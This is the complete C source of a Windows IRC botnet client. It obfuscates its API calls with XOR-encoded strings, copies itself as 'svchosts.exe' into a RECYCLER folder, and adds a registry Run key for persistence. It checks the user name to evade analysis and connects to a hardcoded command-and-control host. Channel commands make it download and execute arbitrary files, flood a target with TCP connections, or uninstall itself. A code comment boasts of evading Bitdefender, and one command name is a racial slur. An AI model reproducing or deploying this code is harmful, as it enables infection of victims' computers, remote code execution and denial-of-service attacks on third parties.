#pragma comment(lib, "wsock32.lib")

#include <windows.h>
#include <stdio.h>

#define S 777

// Config //
char* poopHost = "brick.pbdownforce.com";
char* poopRegNameValue = "Microsoft Corp";
char* poopDirectory = "\x00:\\RECYCLER"; // Autofills drive (leave \x00)
char* poopExeFile = "svchosts.exe";
char* Channel = "#test";
unsigned short Port = htons(6112);
// CONFIG //

char Drive;

char* EncUser = "\x00\x55\x52\x47\x51";
char* EncNick = "\x00\x4E\x48\x41\x48";
char* EncJoin = "\x00\x4A\x4E\x4B\x4D";
char* EncPing = "\x00\x50\x48\x4C\x44";
char* EncPong = "\x00\x50\x4E\x4C\x44";
char* EncPrivmsg = "\x00\x50\x53\x4B\x55\x49\x56\x41";
char* EncSendUser = "\x00\x55\x52\x47\x51\x24\x35\x26\x37\x28\x39\x2A\x3B";
char* EncSend = "\x00\x73\x64\x6C\x67";
char* EncZs = "\x00\x72\x64\x61\x75";
char* EncSocket = "\x00\x73\x6E\x61\x68\x61\x71";
char* EncConnect = "\x00\x63\x6E\x6C\x6D\x61\x66\x72";
char* EncWS = "\x00\x57\x52\x43\x50\x70\x64\x74\x73\x7D\x79";
char* EncWsDLL = "\x00\x77\x72\x30\x5C\x37\x37\x28\x63\x64\x65";
char* EncGethost = "\x00\x67\x64\x76\x6B\x6B\x76\x72\x65\x71\x67\x6B\x66\x69";
char* EncWinExec = "\x00\x57\x68\x6C\x46\x7C\x60\x65";
char* EncGetFileName = "\x00\x47\x64\x76\x4E\x6B\x61\x73\x6B\x6D\x4F\x63\x67\x69\x43\x6F\x62\x75\x50";
char* EncGetModule = "\x00\x47\x64\x76\x4E\x6B\x61\x73\x6B\x6D\x41\x6B\x65\x68\x61\x6B\x4E";
char* EncCreateDir = "\x00\x43\x73\x67\x62\x70\x60\x42\x6E\x7A\x6C\x69\x7F\x63\x7F\x77\x4E";
char* EncRegCreate = "\x00\x52\x64\x65\x40\x76\x60\x67\x73\x6D\x42\x6F\x72\x49\x75\x4F";
char* EncRegSet = "\x00\x52\x64\x65\x50\x61\x71\x50\x66\x64\x7C\x6F\x4E\x74\x4C";
char* EncM00teix = "\x00\x43\x73\x67\x62\x70\x60\x4B\x72\x7C\x6C\x72\x4A";
char* EncCopyFile = "\x00\x43\x6E\x72\x7A\x42\x6C\x6A\x62\x49";
char* EncKernel = "\x00\x4B\x44\x50\x4D\x41\x49\x35\x35\x26\x6D\x66\x67";
char* EncAdvapi = "\x00\x61\x65\x74\x62\x74\x6C\x35\x35\x26\x6D\x66\x67";
char* EncUrlmonDLL = "\x00\x75\x73\x6E\x6E\x6B\x6B\x28\x63\x64\x65";
char* EncDownloadFile = "\x00\x55\x53\x4E\x47\x6B\x72\x68\x6B\x67\x68\x6E\x5F\x63\x4B\x67\x63\x75\x50";
char* EncRegPlace = "\x00\x53\x4E\x44\x57\x53\x44\x54\x42\x54\x55\x47\x62\x6F\x7F\x61\x7C\x7F\x77\x66\x4F\x48\x42\x7F\x79"
                     "\x7C\x76\x6D\x68\x40\x41\x5D\x6A\x52\x53\x47\x4D\x50\x73\x43\x55\x5B\x40\x45\x45\x70\x71\x7C\x5A\x5E";

typedef int( __stdcall* truncate )( SOCKET, const char*, int, int );
truncate shino;

typedef int( __stdcall* tyco )( SOCKET, const char*, int, int );
tyco frecv;

typedef SOCKET( __stdcall* jewf )( int, int, int );
jewf thing;

typedef int( __stdcall* newz )( SOCKET, const struct sockaddr*, int );
newz doneq;

typedef int( __stdcall* WS )( WORD, LPWSADATA );
WS fWSAStartup;

typedef struct hostent* FAR( __stdcall* GHBN )( char* );
GHBN fgethostbyname;

typedef unsigned long( __stdcall* GeTwHaT )( HMODULE, LPTSTR, DWORD );
GeTwHaT fGetModuleFileName;

typedef HMODULE( __stdcall* fish )( LPCTSTR );
fish fGetModuleHandle;

typedef BOOL( __stdcall* CD )( LPCTSTR, LPSECURITY_ATTRIBUTES );
CD fCreateDirectory;

typedef LONG( __stdcall* RCKE )( HKEY, LPCTSTR, DWORD, LPTSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD );
RCKE fRegCreateKeyEx;

typedef LONG( __stdcall* RSVE )( HKEY, LPCTSTR, DWORD, DWORD, const BYTE*, DWORD );
RSVE fRegSetValueEx;

typedef HANDLE( __stdcall* CM )( LPSECURITY_ATTRIBUTES, BOOL, LPCTSTR );
CM fM00teix;

typedef BOOL( __stdcall* CF )( LPCTSTR, LPCTSTR, BOOL );
CF fCopyFile;

typedef UINT( __stdcall* WE )( LPCSTR, UINT );
WE fWinExec;

typedef HRESULT( __stdcall* whatdidyousay )( LPUNKNOWN, LPCTSTR, LPCTSTR, DWORD, LPBINDSTATUSCALLBACK );
whatdidyousay fURLDownloadToFile;

bool LoadFunctions( );
bool winzocket( );
void IncStrings( );
char* Decrypt( char* poopString );
unsigned long findprotocol( char* poopHost );
bool putproto( SOCKET sSocket, char* poopPacket, ... );
void checkin( );
unsigned long __stdcall doodlebug( void* pVoid );
SOCKET ridged( unsigned long dwIp, unsigned short wPort );
bool imgonago( );
void ParseIRC( SOCKET sSocket, char* poopLine );
void StartCommand( bool bDelete, char* poopContent, ... );
void Install( );

bool LoadFunctions( )
{
    char* poopWsDLL = Decrypt( EncWsDLL );
    char* poopSend = Decrypt( EncSend );
    char* poopZs = Decrypt( EncZs );
    char* poopSocket = Decrypt( EncSocket );
    char* poopConnect = Decrypt( EncConnect );
    char* poopWS = Decrypt( EncWS );
    char* poopGethost = Decrypt( EncGethost );
    char* poopExec = Decrypt( EncWinExec );
    char* poopGetFile = Decrypt( EncGetFileName );
    char* poopGetModule = Decrypt( EncGetModule );
    char* poopCreateDir = Decrypt( EncCreateDir );
    char* poopRegCreate = Decrypt( EncRegCreate );
    char* poopRegSet = Decrypt( EncRegSet );
    char* poopM00teix = Decrypt( EncM00teix );
    char* poopCopyFile = Decrypt( EncCopyFile );
    char* poopKernel = Decrypt( EncKernel );
    char* poopAdvapi = Decrypt( EncAdvapi );

    HMODULE hWinsock = LoadLibrary( poopWsDLL );

    shino = (truncate)GetProcAddress( hWinsock, poopSend );
    frecv = (tyco)GetProcAddress( hWinsock, poopZs );
    thing = (jewf)GetProcAddress( hWinsock, poopSocket );
    doneq = (newz)GetProcAddress( hWinsock, poopConnect );
    fWSAStartup = (WS)GetProcAddress( hWinsock, poopWS );
    fgethostbyname = (GHBN)GetProcAddress( hWinsock, poopGethost );

    FreeLibrary( hWinsock );

    HMODULE hKernel = LoadLibrary( poopKernel );

    fGetModuleFileName = (GeTwHaT)GetProcAddress( hKernel, poopGetFile );
    fGetModuleHandle = (fish)GetProcAddress( hKernel, poopGetModule );
    fCreateDirectory = (CD)GetProcAddress( hKernel, poopCreateDir );
    fM00teix = (CM)GetProcAddress( hKernel, poopM00teix );
    fCopyFile = (CF)GetProcAddress( hKernel, poopCopyFile );
    fWinExec = (WE)GetProcAddress( hKernel, poopExec );

    FreeLibrary( hKernel );

    HMODULE hAdvapi = LoadLibrary( poopAdvapi );

    fRegCreateKeyEx = (RCKE)GetProcAddress( hAdvapi, poopRegCreate );
    fRegSetValueEx = (RSVE)GetProcAddress( hAdvapi, poopRegSet );

    FreeLibrary( hAdvapi );

    delete [] poopWsDLL, poopWS, poopSend, poopZs, poopSocket, poopConnect, poopGethost, poopExec, poopKernel, poopAdvapi,
              poopGetFile, poopGetModule, poopCreateDir, poopRegCreate, poopRegSet, poopM00teix, poopCopyFile;

    return true;
};

//InitWinsock
bool winzocket( )
{
    char* poopWsDLL = Decrypt( EncWsDLL );
    LoadLibrary( poopWsDLL );

    delete [] poopWsDLL;

    WSADATA wsa;
    if( fWSAStartup( 0x0202, &wsa ) )
        return false;

    return true;
};

void IncStrings( )
{
    *EncUser++;
    *EncNick++;
    *EncJoin++;
    *EncPing++;
    *EncPong++;
    *EncPrivmsg++;
    *EncSendUser++;
    *EncAdvapi++;
    *EncKernel++;
    *EncSend++;
    *EncZs++;
    *EncSocket++;
    *EncConnect++;
    *EncWS++;
    *EncWsDLL++;
    *EncGethost++;
    *EncWinExec++;
    *EncGetFileName++;
    *EncGetModule++;
    *EncCreateDir++;
    *EncRegCreate++;
    *EncRegSet++;
    *EncCopyFile++;
    *EncM00teix++;
    *EncRegPlace++;
    *EncUrlmonDLL++;
    *EncDownloadFile++;
};

char* Decrypt( char* poopString )
{
    int iStringLength = strlen( poopString );
    char* poopTempBuff = new char[ iStringLength + 1 ];

    strcpy( poopTempBuff, poopString );

    for( int i = 0; i < iStringLength; i++ )
        poopTempBuff[ i ] = i ^ poopTempBuff[ i ];

    poopTempBuff[ iStringLength ] = 0;

    return( poopTempBuff );
};

//ResolveHost
unsigned long findprotocol( char* poopHost )
{
    struct hostent* hGetHost = fgethostbyname( poopHost );

    if( !hGetHost )
        return 0;

    return( (*(struct in_addr *)hGetHost->h_addr).s_addr );
};

//SendPacket
bool putproto( SOCKET sSocket, char* poopPacket, ... )
{
    char poopSendBuff[ 0x500 ];

    ZeroMemory( poopSendBuff, sizeof( poopSendBuff ) );

    va_list vArgs;
    va_start( vArgs, poopPacket );
    vsprintf( poopSendBuff, poopPacket, vArgs );
    va_end( vArgs );

    strcat( poopSendBuff, "\r\n" );
    return( shino( sSocket, poopSendBuff, strlen( poopSendBuff ), 0 ) > 0 ? true : false );   
};

//AntiInspect
void checkin( )
{
    char poopBuffer[ 256 ];
    unsigned long size = sizeof( poopBuffer );

    GetUserName( poopBuffer, &size );

    if( !strcmp( poopBuffer, "CurrentUser" ) )
    {
        ExitProcess( 0 );
    }
};

void slickwilly(char *target, char *port, char *len)
{
	unsigned short p = (unsigned short)atoi(port);
	int t = atoi(len);
//	const int S = atoi(sockets);

	int skydelay = 100;
	SOCKADDR_IN    pocket;
	SOCKET         cookie[S];
   	IN_ADDR iaddr;
	memset(&pocket, 0, sizeof(pocket));
	pocket.sin_family = AF_INET;
   	pocket.sin_port = htons(p);
	LPHOSTENT lpHostEntry = NULL;
 	DWORD mode = 1;
	int c,i;
	iaddr.s_addr = inet_addr(target);
	pocket.sin_addr = iaddr; //ip addy
	i = 0;
	while (i < t)
	{
		for (c=0;c<S;c++)
		{
			cookie[c] = socket(AF_INET, SOCK_STREAM, 0);
			if (cookie[c] == INVALID_SOCKET)
				goto bottom;
			ioctlsocket(cookie[c],FIONBIO,&mode);
		}
		for (c=0;c<S;c++)
		{
  	//		if(connect(cookie[c], (PSOCKADDR) &pocket, sizeof(pocket))==SOCKET_ERROR)
	//		{	
	//			goto bottom;
	//			break;
	//		}
	//		else
	//		{
				connect(cookie[c], (PSOCKADDR) &pocket, sizeof(pocket));
	//		}
   //   		Sleep(skydelay);
		}
		for (c=0;c<S;c++)
			closesocket(cookie[c]); //close sockets
		i++;
	}bottom:;

	Sleep( 2000 );
//	SOCKET sIrcSocket = -1;
//	while( ridged( findprotocol( poopHost ), Port ) == -1 )//Declares a SOCKET_ERROR
//	{
//		closesocket( ridged( findprotocol( poopHost ), Port ) );
//		Sleep( 3000 );
//	}
//	Sleep( 2000 );
//	ExitProcess(0);
//	while(imgonago())
//	{
	//	ExitProcess(0);
	//	LoadFunctions( );
	//	winzocket( );
	//	imgonago( );
//	}
};

unsigned long __stdcall doodlebug( void* pVoid )
{
    char poopPath[ 32 ] = "\x00:\\";
    poopPath[ 0 ] = Drive;

    char* poopLink = (char *)pVoid;
    char* poopUrlmonDLL = Decrypt( EncUrlmonDLL );
    HMODULE hUrlmon = LoadLibrary( poopUrlmonDLL );

    delete [] poopUrlmonDLL;

    for( int i = 3; i < 8; i++ )
        poopPath[ i ] = "abcdefghijklmnopqrstuvwxyz"[ rand( ) % 26 ];
   
    strcat( poopPath, ".exe" );

    if( hUrlmon )
    {
        char* poopDownloadFile = Decrypt( EncDownloadFile );
        fURLDownloadToFile = (whatdidyousay)GetProcAddress( hUrlmon, poopDownloadFile );
   
        delete [] poopDownloadFile;

        HRESULT hDownload = fURLDownloadToFile( 0, poopLink, poopPath, 0, 0 );   
    }

    FreeLibrary( hUrlmon );

    fWinExec( poopPath, 0 );

    return 0;
};

//ConnectIRC
SOCKET ridged( unsigned long dwIp, unsigned short wPort )
{
    SOCKET sSocket;
    SOCKADDR_IN sSin;

    sSin.sin_family = AF_INET;
    sSin.sin_port = wPort;
    sSin.sin_addr.s_addr = dwIp;

    sSocket = thing( AF_INET, SOCK_STREAM, IPPROTO_TCP );

    if( doneq( sSocket, (SOCKADDR *) &sSin, sizeof( sSin ) ) == SOCKET_ERROR )
    {
        return -1;
    }

    return( sSocket );
};

//StartIRC
bool imgonago( )
{
    SOCKET sIrcSocket = ridged( findprotocol( poopHost ), Port );
    if( sIrcSocket == -1 )
        return false;

    char poopZs[ 512 ], poopBotNick[ 32 ];
    char* poopNick = Decrypt( EncNick );

    for( int i = 0; i < 8; i++ )
        poopBotNick[ i ] = "abcdefghijklmnopqrstuvwxyz"[ rand( ) % 26 ];

    poopBotNick[ 8 ] = 0;

	Sleep( 100 );

    putproto( sIrcSocket, "HELO" ); // lol bypasses bitdefender AV
    putproto( sIrcSocket, "%s %s", poopNick, poopBotNick );

 //   delete [] poopNick;
       
    int Curbyte = 0;

    while( frecv( sIrcSocket, (char *) &poopZs[ Curbyte ], 1, 0 ) > 0 )
    {
        switch( poopZs[ Curbyte ] )
        {
        case 0x0D:
            poopZs[ Curbyte ] = 0;
            Curbyte++;
            break;
        case 0x0A:
            poopZs[ Curbyte ] = 0;           
            ParseIRC( sIrcSocket, poopZs );
            Curbyte = 0;
            break;
        default:
            Curbyte++;
            break;
        }
    }

    return true;
};

void ParseIRC( SOCKET sSocket, char* poopLine )
{
    char* poopParam[ 32 ];
    int i;

    poopParam[ 0 ] = strtok( poopLine, " " );

    for( i = 1; i < 32; i++ )
		poopParam[ i ] = strtok( NULL, " \r\n" );

    char* poopPing = Decrypt( EncPing );

    if( !stricmp( poopParam[ 0 ], poopPing ) )
    {
        char* poopPong = Decrypt( EncPong );
        putproto( sSocket, "%s %s", poopPong, poopParam[ 1 ] );
//        delete [] poopPing, poopPong;
    }

    char* poopJoin = Decrypt( EncJoin );

    switch( atoi( poopParam[ 1 ] ) )
    {
    case 005:
        putproto( sSocket, "%s %s", poopJoin, Channel );
        break;
    case 451:
        char* poopSendUser = Decrypt( EncSendUser );
        putproto( sSocket, poopSendUser );
//        delete [] poopSendUser;
        break;
    }

 //   delete [] poopJoin;

    if( poopParam[ 3 ] == NULL )
        return;

    char* poopPrivmsg = Decrypt( EncPrivmsg );
   
    if( !stricmp( poopParam[ 3 ], ":.wget" ) )
    {
        if( poopParam[ 4 ] == NULL )
            return;

        CreateThread( 0, 0, &doodlebug, (void *)poopParam[ 4 ], 0, 0 );
    }

    else if( !stricmp( poopParam[ 3 ], ":.hitme" ) )
    {
        char* ip = (char* ) poopParam[ 4 ];
        char* port = (char* ) poopParam[ 5 ];
        char* length = (char* ) poopParam[ 6 ];
//	  char* sockets = (char* ) poopParam[ 7 ];
		if ( ip!=NULL && port!=NULL && length!=NULL )
			slickwilly ( ip, port, length );
    }

    else if( !stricmp( poopParam[ 3 ], ":.peacenigga" ) )
    {
        char poopInstallPath[ 128 ];
        HKEY hReg;
       
        sprintf( poopInstallPath, "%s\\%s", poopDirectory, poopExeFile );
        StartCommand( false, ":2\r\ndel \"%s\"\r\nif exist \"%s\" goto 2\r\n", poopInstallPath, poopInstallPath );

        fRegCreateKeyEx( HKEY_LOCAL_MACHINE, Decrypt( EncRegPlace ), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hReg, NULL );
        RegDeleteValue( hReg, poopRegNameValue );
        RegCloseKey( hReg );

        ExitProcess( 0 );
    }

 //   delete [] poopPrivmsg;
};

void StartCommand( bool bDelete, char* poopContent, ... )
{
    char poopBuffer[ 0x400 ], poopBatFile[ 0x10 ] = "\x00:\\";
    unsigned long uBytesWritten;

    ZeroMemory( poopBuffer, sizeof( poopBuffer ) );

    poopBatFile[ 0 ] = Drive;

    va_list vArgs;
    va_start( vArgs, poopContent );
    vsprintf( poopBuffer, poopContent, vArgs );
    va_end( vArgs );

    for( int i = 3; i < 8; i++ )
        poopBatFile[ i ] = ( 0x42 + rand( ) % ( 0x54 - 0x42 ) );

    strcat( poopBatFile, ".bat" );

    HANDLE hHandle = CreateFile( poopBatFile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
    WriteFile( hHandle, poopBuffer, strlen( poopBuffer ), &uBytesWritten, 0 );
    CloseHandle( hHandle );

    fWinExec( poopBatFile, SW_HIDE );

    Sleep( 1000 );

    if( bDelete )
    {
        DeleteFile( poopBatFile );
    }
};

void Install( )
{
    char poopFilePath[ 0x100 ], poopInstallPath[ 0x100 ];
    HKEY hReg;
   
    fGetModuleFileName( fGetModuleHandle( 0 ), poopFilePath, sizeof( poopFilePath ) );
    fCreateDirectory( poopDirectory, 0 );   
    sprintf( poopInstallPath, "%s\\%s", poopDirectory, poopExeFile );

    char* poopRegPlace = Decrypt( EncRegPlace );
    fRegCreateKeyEx( HKEY_LOCAL_MACHINE, poopRegPlace, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hReg, NULL );
   
    delete [] poopRegPlace;

    fRegSetValueEx( hReg, poopRegNameValue, 0, REG_SZ, (unsigned char *)poopInstallPath, strlen( poopInstallPath ) + 1 );
    RegCloseKey( hReg );

    if( !strcmp( poopInstallPath, poopFilePath ) )
    {
        fM00teix( NULL, FALSE, "Steamm" );
           
        if( GetLastError( ) == 0xB7 )
        {
            ExitProcess( 0 );
        }
    }
    else
    {
        StartCommand( true, "copy \"%s\" \"%s\"", poopFilePath, poopInstallPath );
        StartCommand( true, "\"%s\"", poopInstallPath );
        ExitProcess( 0 );
    }
};

bool StartAll( )
{
    char poopBuffer[ 128 ];
    GetSystemDirectory( poopBuffer, sizeof( poopBuffer ) );

    Drive = *poopBuffer;
    *poopDirectory = Drive;

    srand( GetTickCount( ) );

    IncStrings( );

    if( !LoadFunctions( ) )
        return false;

    checkin( );
    Install( );

    if( !winzocket( ) )
        return false;

    return true;
};

int WINAPI WinMain( HINSTANCE hIhhnstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd )
{
	if( !StartAll( ) )
		return false;
	while( !imgonago( ) )
	{
		Sleep( 1000 );
	}
    return 0;
};